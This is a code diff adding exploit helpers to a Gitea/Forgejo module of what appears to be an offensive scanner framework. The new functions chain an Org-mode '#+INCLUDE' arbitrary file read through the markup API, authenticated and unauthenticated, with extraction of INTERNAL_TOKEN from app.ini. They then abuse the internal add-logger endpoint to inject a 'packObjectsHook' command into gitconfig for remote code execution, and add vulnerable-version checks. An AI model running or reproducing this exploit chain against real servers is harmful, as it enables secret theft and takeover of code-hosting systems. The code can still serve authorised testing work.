@@ -6,6 +6,7 @@
 from __future__ import annotations
 
 import hashlib
+import json
 import os
 import random
 import re
@@ -16,13 +17,12 @@ from typing import Any, Dict, Optional, Tuple
 from core.framework.base_module import BaseModule
 from lib.scanner.http.response_validation import parse_json_response
 
-GITEA_PATCHED_VERSION = "1.27.1"
-DEFAULT_HOOK_SLEEP = 4
-DIFFPATCH_PATH = "/api/v1/repos/{owner}/{repo}/diffpatch"
-
-
 class Gitea(BaseModule):
     """Gitea / Forgejo helper mixin for scanner and exploit modules."""
+
+    PATCHED_VERSION = "1.27.1"
+    DEFAULT_HOOK_SLEEP = 4
+    DIFFPATCH_PATH = "/api/v1/repos/{owner}/{repo}/diffpatch"
 
     _HTML_VERSION_RES = (
         re.compile(r"Version:\s*([\d.]+)", re.I),
@@ -65,7 +65,8 @@ class Gitea(BaseModule):
         return match.group(1) if match else text
 
     @classmethod
-    def gitea_is_patched(cls, version: str, patched: str = GITEA_PATCHED_VERSION) -> bool:
+    def gitea_is_patched(cls, version: str, patched: str | None = None) -> bool:
+        patched = patched or cls.PATCHED_VERSION
         clean = cls.normalize_version(version)
         if not clean:
             return False
@@ -77,6 +78,12 @@ class Gitea(BaseModule):
             base = str(getattr(self.base_path, "value", self.base_path) or "").strip()
         base = base.rstrip("/")
         return base if base.startswith("/") else (f"/{base}" if base else "")
+
+    def gitea_hook_sleep_seconds(self) -> int:
+        raw = getattr(self, "hook_sleep", None)
+        if hasattr(raw, "value"):
+            raw = raw.value
+        return max(int(raw or self.DEFAULT_HOOK_SLEEP), 1)
 
     def gitea_join_path(self, path: str) -> str:
         base = self.gitea_base_path()
@@ -172,6 +179,174 @@ class Gitea(BaseModule):
             }
         )
         return result
+
+    def gitea_basic_auth_header(self, username: str, password: str) -> str:
+        import base64
+
+        token = base64.b64encode(f"{username}:{password}".encode()).decode()
+        return f"Basic {token}"
+
+    def gitea_markup_org_include(
+        self,
+        username: str,
+        password: str,
+        repo_path: str,
+        absolute_path: str,
+    ) -> tuple[int, str]:
+        """Read ``absolute_path`` via Org-mode #+INCLUDE (markup API)."""
+        if '"' in absolute_path:
+            raise ValueError("path cannot contain double quotes")
+        payload_text = f'#+INCLUDE: "{absolute_path}" src text'
+        body = {
+            "Mode": "file",
+            "Text": payload_text,
+            "FilePath": "include.org",
+            "Context": repo_path,
+        }
+        r = self.http_request(
+            method="POST",
+            path=self.gitea_join_path("/api/v1/markup"),
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": self.gitea_basic_auth_header(username, password),
+            },
+            data=json.dumps(body),
+        )
+        if not r:
+            return 0, ""
+        text = r.text or ""
+        if int(r.status_code) != 200:
+            return int(r.status_code), text
+        stripped = re.sub(r"<[^>]+>", "\n", text)
+        stripped = re.sub(r"\n{2,}", "\n", stripped).strip()
+        return 200, stripped
+
+    def gitea_search_public_repo_unauth(self, limit: int = 5) -> str:
+        response = self.gitea_http_get(
+            f"/api/v1/repos/search?limit={int(limit)}&sort=recentupdate",
+            allow_redirects=False,
+        )
+        if not response or int(response.status_code or 0) != 200:
+            return ""
+        data, _ = parse_json_response(response)
+        items = (data or {}).get("data") or []
+        for repo in items:
+            if isinstance(repo, dict) and not repo.get("private", True):
+                return str(repo.get("full_name") or "")
+        return ""
+
+    def gitea_repo_markup_include(self, repo_full: str, absolute_path: str) -> Tuple[int, str]:
+        """Unauthenticated Org-mode #+INCLUDE via POST /{owner}/{repo}/markup."""
+        if '"' in absolute_path:
+            raise ValueError("path cannot contain double quotes")
+        repo_full = str(repo_full or "").strip().strip("/")
+        if "/" not in repo_full:
+            return 0, ""
+        text = f'#+INCLUDE: "{absolute_path}" src text'
+        payload = {
+            "Mode": "file",
+            "FilePath": "poc.org",
+            "Text": text,
+            "Context": repo_full,
+        }
+        response = self.http_request(
+            method="POST",
+            path=self.gitea_join_path(f"/{repo_full}/markup"),
+            json=payload,
+            allow_redirects=False,
+        )
+        if not response:
+            return 0, ""
+        body = response.text or ""
+        if int(response.status_code) != 200:
+            return int(response.status_code), body
+        stripped = re.sub(r"<[^>]+>", "\n", body)
+        stripped = re.sub(r"\n{2,}", "\n", stripped).strip()
+        return 200, stripped
+
+    @staticmethod
+    def gitea_parse_app_ini_fields(blob: str) -> Dict[str, str]:
+        out: Dict[str, str] = {}
+        for key in ("INTERNAL_TOKEN", "APP_DATA_PATH", "GITEA_CUSTOM", "RUN_USER"):
+            match = re.search(rf"^{re.escape(key)}\s*=\s*(.+?)\s*$", blob or "", re.M | re.I)
+            if match:
+                out[key] = match.group(1).strip()
+        return out
+
+    def gitea_internal_add_packobjects_hook(
+        self,
+        internal_token: str,
+        gitconfig_path: str,
+        command: str,
+        *,
+        writer: str = "kittywriter",
+        logger: str = "router",
+    ) -> bool:
+        hook_line = str(command or "id").strip().replace('"', '\\"')
+        payload = {
+            "Logger": logger,
+            "Writer": writer,
+            "Mode": "file",
+            "Config": {
+                "filename": gitconfig_path,
+                "flags": "none",
+                "prefix": f"[uploadpack]\\n        packObjectsHook = {hook_line} ;#",
+                "level": "Info",
+                "rotate": False,
+            },
+        }
+        response = self.http_request(
+            method="POST",
+            path=self.gitea_join_path("/api/internal/manager/add-logger"),
+            headers={
+                "Content-Type": "application/json",
+                "X-Gitea-Internal-Auth": f"token {internal_token}",
+            },
+            json=payload,
+            allow_redirects=False,
+            timeout=30,
+        )
+        return bool(response and int(response.status_code or 0) == 200)
+
+    def gitea_internal_remove_logger(self, internal_token: str, logger: str, writer: str) -> None:
+        self.http_request(
+            method="POST",
+            path=self.gitea_join_path(f"/api/internal/manager/remove-logger/{logger}/{writer}"),
+            headers={"X-Gitea-Internal-Auth": f"token {internal_token}"},
+            allow_redirects=False,
+            timeout=15,
+        )
+
+    def gitea_first_public_repo(self, username: str, password: str) -> str:
+        r = self.http_request(
+            method="GET",
+            path=self.gitea_join_path("/api/v1/repos/search?limit=5"),
+            headers={"Authorization": self.gitea_basic_auth_header(username, password)},
+        )
+        if not r or int(r.status_code) != 200:
+            return ""
+        data, _ = parse_json_response(r)
+        items = (data or {}).get("data") or []
+        for repo in items:
+            if isinstance(repo, dict) and not repo.get("private", True):
+                return str(repo.get("full_name") or "")
+        return ""
+
+    @classmethod
+    def markup_vulnerable_59774(cls, version: str, forge: str = "") -> Optional[bool]:
+        """True for Gitea < 1.27.1 or Forgejo 7.0–15.0.5 / 16.0.0–16.0.1."""
+        clean = cls.normalize_version(version)
+        if not clean:
+            return None
+        forge_name = (forge or "").lower()
+        if forge_name == "gitea" or clean.startswith("1."):
+            return cls.version_less_than(clean, "1.27.1")
+        parts = cls.parse_version_parts(clean)
+        if parts[0] >= 16:
+            return parts[0] == 16 and parts[1] == 0 and (parts[2] < 2 if len(parts) > 2 else True)
+        if parts[0] == 15:
+            return parts[2] < 6 if len(parts) > 2 else True
+        return parts[0] >= 7
 
     def gitea_version_vulnerable(self, version: str, forge: str = "") -> Optional[bool]:
         clean = self.normalize_version(version)
@@ -281,10 +456,12 @@ class Gitea(BaseModule):
     def gitea_build_hook_patch(
         command: str,
         callback: str = "",
-        hook_sleep: int = DEFAULT_HOOK_SLEEP,
+        hook_sleep: int | None = None,
         marker: str = "CVE-2026-60004",
     ) -> Tuple[str, str]:
         """Return (hook_script, unified_diff)."""
+        if hook_sleep is None:
+            hook_sleep = Gitea.DEFAULT_HOOK_SLEEP
         evidence_file = f"/tmp/gitea_poc_{Gitea.gitea_random_id(length=6)}.txt"
         hook_lines = [
             "#!/bin/sh",
@@ -372,3 +549,9 @@ class Gitea(BaseModule):
             allow_redirects=False,
             timeout=10,
         )
+
+
+# Backward-compatible module-level aliases (prefer Gitea.PATCHED_VERSION in new code).
+GITEA_PATCHED_VERSION = Gitea.PATCHED_VERSION
+DEFAULT_HOOK_SLEEP = Gitea.DEFAULT_HOOK_SLEEP
+DIFFPATCH_PATH = Gitea.DIFFPATCH_PATH
